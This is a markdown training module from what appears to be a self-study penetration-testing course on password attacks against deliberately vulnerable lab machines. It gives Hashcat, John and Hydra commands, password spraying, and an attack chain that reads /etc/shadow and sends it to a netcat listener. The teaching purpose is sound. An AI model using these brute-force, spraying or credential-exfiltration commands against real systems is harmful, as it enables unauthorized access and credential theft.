# 🔑 Phase 2: Password Attacks (Week 3)

> **Goal**: Master hash identification, password cracking, brute forcing, and password spraying.
> **Your existing notes**: `attacks/` folder

---

## 📋 Table of Contents

- [🔑 Phase 2: Password Attacks (Week 3)](#-phase-2-password-attacks-week-3)
  - [📋 Table of Contents](#-table-of-contents)
  - [1. Setup \& Targets](#1-setup--targets)
  - [2. Understanding Hashes](#2-understanding-hashes)
    - [2.1 — Hash Identification](#21--hash-identification)
    - [2.2 — Creating Hashes (for understanding)](#22--creating-hashes-for-understanding)
  - [3. Cracking with Hashcat](#3-cracking-with-hashcat)
    - [Common Hash Modes](#common-hash-modes)
    - [Exercises](#exercises)
  - [4. Cracking with John the Ripper](#4-cracking-with-john-the-ripper)
  - [5. Online Brute Forcing with Hydra](#5-online-brute-forcing-with-hydra)
    - [5.1 — Network Service Brute Force](#51--network-service-brute-force)
  - [6. Web Application Brute Forcing](#6-web-application-brute-forcing)
    - [6.1 — DVWA Brute Force (All Levels)](#61--dvwa-brute-force-all-levels)
    - [6.2 — Juice Shop Authentication Challenges](#62--juice-shop-authentication-challenges)
    - [6.3 — bWAPP Broken Authentication](#63--bwapp-broken-authentication)
    - [6.4 — WebGoat Authentication Bypass](#64--webgoat-authentication-bypass)
  - [7. Password Spraying](#7-password-spraying)
  - [8. Wordlist Generation \& Rules](#8-wordlist-generation--rules)
    - [8.1 — Custom Wordlists](#81--custom-wordlists)
    - [8.2 — Hashcat Rules](#82--hashcat-rules)
  - [9. Full Password Attack Chain](#9-full-password-attack-chain)
  - [10. Practice on Online Platforms](#10-practice-on-online-platforms)
    - [PortSwigger Authentication Labs (Free)](#portswigger-authentication-labs-free)
  - [11. Weekly Schedule](#11-weekly-schedule)
  - [12. Checklist \& Progress Tracker](#12-checklist--progress-tracker)
    - [Hash Identification \& Understanding](#hash-identification--understanding)
    - [Offline Cracking](#offline-cracking)
    - [Online Brute Forcing](#online-brute-forcing)
    - [Web Brute Forcing](#web-brute-forcing)
    - [Wordlists \& Advanced](#wordlists--advanced)
    - [Online Platforms](#online-platforms)

---

## 1. Setup & Targets

| Target           | What to Practice                                     |
| ---------------- | ---------------------------------------------------- |
| Metasploitable 2 | SSH/FTP/Telnet brute force, password file extraction |
| DVWA             | Web login brute force (all difficulty levels)        |
| Juice Shop       | Authentication bypass challenges                     |
| WebGoat          | Authentication flaws module                          |
| bWAPP            | Brute force, broken authentication                   |
| Crackstation.net | Online hash lookup                                   |

```bash
# Prepare rockyou wordlist (first-time setup)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Start WebGoat for auth exercises
docker run -d -p 8080:8080 --name webgoat webgoat/webgoat

# Create a small custom wordlist for speed
echo -e "admin\npassword\npassword123\nmsfadmin\nroot\ntest\ntest123\nletmein\n123456\nqwerty" > ~/small_wordlist.txt
```

---

## 2. Understanding Hashes

### 2.1 — Hash Identification

```bash
# hash-identifier
hash-identifier
# Paste these and identify them:
# 5f4dcc3b5aa765d61d8327deb882cf99           → MD5
# e10adc3949ba59abbe56e057f20f883e           → MD5
# $1$xyz$abcdefghijklmnop                    → MD5crypt
# $5$rounds=5000$salt$hash                   → SHA-256crypt
# $6$rounds=5000$salt$hash                   → SHA-512crypt
# $2b$12$...                                 → bcrypt
# aad3b435b51404ee:hash                      → NTLM (Windows)

# hashid (alternative, more types)
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hashid '$6$rounds=5000$salt$hash'

# Online tools
# https://hashes.com/en/tools/hash_identifier
# https://www.tunnelsup.com/hash-analyzer/
```

### 2.2 — Creating Hashes (for understanding)

```bash
# MD5
echo -n "password123" | md5sum

# SHA-1
echo -n "password123" | sha1sum

# SHA-256
echo -n "password123" | sha256sum

# SHA-512
echo -n "password123" | sha512sum

# Linux-style MD5crypt
openssl passwd -1 -salt mysalt password123

# Linux-style SHA-512crypt
openssl passwd -6 -salt mysalt password123

# NTLM (Windows) — using Python
python3 -c "import hashlib; print(hashlib.new('md4', 'password123'.encode('utf-16le')).hexdigest())"
```

---

## 3. Cracking with Hashcat

### Common Hash Modes

| Mode  | Hash Type          | Example Command                          |
| ----- | ------------------ | ---------------------------------------- |
| 0     | MD5                | `hashcat -m 0 hash.txt wordlist.txt`     |
| 100   | SHA-1              | `hashcat -m 100 hash.txt wordlist.txt`   |
| 1000  | NTLM               | `hashcat -m 1000 hash.txt wordlist.txt`  |
| 1400  | SHA-256            | `hashcat -m 1400 hash.txt wordlist.txt`  |
| 500   | MD5crypt ($1$)     | `hashcat -m 500 hash.txt wordlist.txt`   |
| 1800  | SHA-512crypt ($6$) | `hashcat -m 1800 hash.txt wordlist.txt`  |
| 3200  | bcrypt             | `hashcat -m 3200 hash.txt wordlist.txt`  |
| 5600  | NTLMv2             | `hashcat -m 5600 hash.txt wordlist.txt`  |
| 13100 | Kerberoast         | `hashcat -m 13100 hash.txt wordlist.txt` |
| 18200 | AS-REP Roast       | `hashcat -m 18200 hash.txt wordlist.txt` |

### Exercises

```bash
# Exercise 1: Crack an MD5 hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# Answer: "password"

# Exercise 2: Crack an MD5 hash with rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Exercise 3: Crack a SHA-256 hash
echo -n "letmein" | sha256sum | cut -d' ' -f1 > sha256_hash.txt
hashcat -m 1400 sha256_hash.txt /usr/share/wordlists/rockyou.txt

# Exercise 4: Brute force a short password (mask attack)
hashcat -m 0 hash.txt -a 3 "?l?l?l?l?l?l"   # 6 lowercase letters

# Exercise 5: Show cracked passwords
hashcat -m 0 hash.txt --show
```

---

## 4. Cracking with John the Ripper

```bash
# Exercise 1: Crack MD5 hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Exercise 2: Crack Linux shadow file hashes
# After getting /etc/shadow from Metasploitable:
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Exercise 3: Crack with rules (mutation)
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt

# Exercise 4: Crack zip file password
zip2john protected.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Exercise 5: Crack SSH key passphrase
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --show hash.txt
```

---

## 5. Online Brute Forcing with Hydra

### 5.1 — Network Service Brute Force

```bash
# FTP brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.20 ftp -t 4

# SSH brute force
hydra -l msfadmin -P ~/small_wordlist.txt 192.168.56.20 ssh -t 4

# Telnet brute force
hydra -l msfadmin -P ~/small_wordlist.txt 192.168.56.20 telnet

# Multiple users
hydra -L users.txt -P ~/small_wordlist.txt 192.168.56.20 ssh -t 4

# MySQL brute force
hydra -l root -P ~/small_wordlist.txt 192.168.56.20 mysql

# VNC brute force
hydra -P ~/small_wordlist.txt 192.168.56.20 vnc

# RDP brute force (Windows targets)
hydra -l admin -P ~/small_wordlist.txt target_ip rdp
```

**📝 Questions after each exercise:**
- Which credentials did you find?
- How long did the attack take?
- What's the effect of thread count (`-t`) on speed and reliability?

---

## 6. Web Application Brute Forcing

### 6.1 — DVWA Brute Force (All Levels)

```bash
# Low security — simple GET form
hydra -l admin -P ~/small_wordlist.txt 192.168.56.20 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=YOUR_SESSION"

# Use Burp Suite Intruder:
# 1. Intercept the login request
# 2. Send to Intruder
# 3. Mark the password field as payload position
# 4. Load wordlist → Start Attack
# 5. Look for different response length = successful login

# Medium security — adds sleep(2) on failure
# Same approach but slower — patience required

# High security — adds CSRF token
# Must extract token per request → use Burp Intruder with Recursive Grep
```

### 6.2 — Juice Shop Authentication Challenges

```
⭐ Login Admin — find admin email, brute force or SQLi
⭐ Password Strength — crack a weak password
⭐⭐ Login Bender — find another user's credentials
⭐⭐ Reset Jim's Password — abuse reset mechanism
⭐⭐⭐ Brute Force (admin) — 5-digit numeric PIN
```

### 6.3 — bWAPP Broken Authentication

```
Login to bWAPP (bee/bug):
1. Navigate to "A2 - Broken Auth" → "Session Mgmt - Cookies"
2. Try "A2 - Broken Auth" → "Insecure Login Forms"
3. Try "A2 - Broken Auth" → "Password Attacks"

Practice at Low, Medium, and High security levels.
```

### 6.4 — WebGoat Authentication Bypass

```
Navigate to WebGoat (http://localhost:8080/WebGoat):
1. (A7) Identity & Auth Failure → Authentication Bypasses
2. (A7) Identity & Auth Failure → Insecure Login
3. (A7) Identity & Auth Failure → JWT tokens
```

---

## 7. Password Spraying

```bash
# Concept: Try ONE password against MANY users (avoids lockout)

# Create user list (from Phase 1 SMTP enumeration)
echo -e "root\nmsfadmin\nuser\nservice\nftp\nnobody" > users.txt

# Spray a common password against SSH
hydra -L users.txt -p password123 192.168.56.20 ssh -t 4

# CrackMapExec spraying (for AD environments)
crackmapexec smb 192.168.56.0/24 -u users.txt -p "Password123!" --continue-on-success

# Metasploit password spray
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.56.20
set USER_FILE users.txt
set PASS_FILE ~/small_wordlist.txt
set STOP_ON_SUCCESS true
run
```

---

## 8. Wordlist Generation & Rules

### 8.1 — Custom Wordlists

```bash
# CeWL — generate wordlist from a website
cewl http://192.168.56.20 -d 2 -m 5 -w custom_wordlist.txt
cewl http://192.168.56.20 -d 2 -m 5 --with-numbers -w custom_wordlist.txt

# Crunch — generate pattern-based wordlists
crunch 6 8 -o wordlist.txt                      # 6-8 chars, all lowercase
crunch 8 8 0123456789 -o pins.txt               # 8-digit PINs
crunch 4 4 -t @@%% -o pattern.txt               # 2 letters + 2 numbers

# Combine wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
```

### 8.2 — Hashcat Rules

```bash
# Best64 rule (most effective mutations)
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# d3ad0ne rule (comprehensive)
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Toggle case rule
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/toggles1.rule

# Custom rule: append 2 digits
echo '$?d$?d' > custom.rule
hashcat -m 0 hash.txt wordlist.txt -r custom.rule
```

---

## 9. Full Password Attack Chain

> **Tie together Phase 1 enumeration with password attacks.**

```bash
# Step 1: Enumerate users via SMTP (from Phase 1)
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.56.20

# Step 2: Create user list from results
echo -e "root\nmsfadmin\nuser\nservice" > valid_users.txt

# Step 3: Try password spraying first
hydra -L valid_users.txt -p msfadmin 192.168.56.20 ssh -t 4

# Step 4: If spraying fails, brute force individual users
hydra -l msfadmin -P ~/small_wordlist.txt 192.168.56.20 ssh -t 4

# Step 5: Login with discovered credentials
ssh msfadmin@192.168.56.20

# Step 6: Extract password hashes
cat /etc/shadow

# Step 7: Transfer hashes back to Kali (Phase 3 skills)
# On Kali: nc -lvnp 4444 > shadow.txt
# On target: nc 192.168.56.10 4444 < /etc/shadow

# Step 8: Prepare for offline cracking
unshadow passwd.txt shadow.txt > combined.txt

# Step 9: Crack offline
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 10. Practice on Online Platforms

| Platform     | Challenge                  | Focus                          |
| ------------ | -------------------------- | ------------------------------ |
| TryHackMe    | Hydra room                 | Brute forcing                  |
| TryHackMe    | Crack the Hash             | Hash identification & cracking |
| TryHackMe    | John the Ripper room       | Offline cracking               |
| TryHackMe    | Password Attacks room      | Comprehensive                  |
| DVWA         | Brute Force (Low/Med/High) | Web brute forcing              |
| PortSwigger  | Authentication labs        | Auth bypass, brute force       |
| PicoCTF      | Cryptography challenges    | Hash analysis                  |
| CrackStation | Online lookup              | https://crackstation.net       |
| Hashes.com   | Online lookup              | https://hashes.com             |
| Juice Shop   | Auth challenges            | Modern web auth                |

### PortSwigger Authentication Labs (Free)

> 🔗 https://portswigger.net/web-security/authentication

| Lab                                          | Topic          |
| -------------------------------------------- | -------------- |
| Username enumeration via different responses | Brute force    |
| 2FA simple bypass                            | Auth bypass    |
| Password reset broken logic                  | Reset flaws    |
| Username enumeration via response timing     | Side channel   |
| Brute-forcing a stay-logged-in cookie        | Cookie attacks |

---

## 11. Weekly Schedule

| Day | Activity                                      | Time  |
| --- | --------------------------------------------- | ----- |
| Mon | Hash identification + creating hashes         | 2 hrs |
| Tue | Hashcat: MD5, SHA, NTLM cracking              | 2 hrs |
| Wed | John the Ripper: shadow files, zip, SSH keys  | 2 hrs |
| Thu | Hydra: FTP, SSH, Telnet brute force           | 2 hrs |
| Fri | Web brute force: DVWA all levels + Juice Shop | 2 hrs |
| Sat | Full attack chain exercise + TryHackMe rooms  | 3 hrs |
| Sun | Wordlist generation, rules, review            | 2 hrs |

---

## 12. Checklist & Progress Tracker

### Hash Identification & Understanding
- [ ] Identify 5+ hash types (MD5, SHA-1, SHA-256, NTLM, bcrypt)
- [ ] Create hashes manually (md5sum, sha256sum, openssl)
- [ ] Understand Linux /etc/shadow format

### Offline Cracking
- [ ] Hashcat: Crack MD5 hash
- [ ] Hashcat: Crack with rules (best64)
- [ ] Hashcat: Mask/brute force attack
- [ ] John: Crack MD5 hash
- [ ] John: Crack shadow file hashes
- [ ] John: Crack zip file password
- [ ] John: Crack SSH key passphrase

### Online Brute Forcing
- [ ] Hydra: FTP brute force
- [ ] Hydra: SSH brute force
- [ ] Hydra: Telnet brute force
- [ ] Hydra: MySQL brute force
- [ ] Password spraying with Hydra
- [ ] Password spraying with CrackMapExec

### Web Brute Forcing
- [ ] DVWA Brute Force: Low level
- [ ] DVWA Brute Force: Medium level
- [ ] DVWA Brute Force: High level (CSRF token)
- [ ] Juice Shop: Login Admin
- [ ] bWAPP: Broken Authentication exercises
- [ ] Burp Suite Intruder usage

### Wordlists & Advanced
- [ ] CeWL wordlist from target website
- [ ] Crunch pattern-based wordlist
- [ ] Full attack chain (enum → brute → extract → crack)

### Online Platforms
- [ ] TryHackMe: Hydra room
- [ ] TryHackMe: Crack the Hash
- [ ] TryHackMe: John the Ripper room
- [ ] PortSwigger: 2+ auth labs
- [ ] CrackStation: Look up 5+ hashes

---

> **Previous**: [Phase 1 — Information Gathering](../phase_1_information_gathering/information_gathering.md)
> **Next Phase**: [Phase 3 — File Transfer](../phase_3_file_transfer/file_transfer.md) 📁
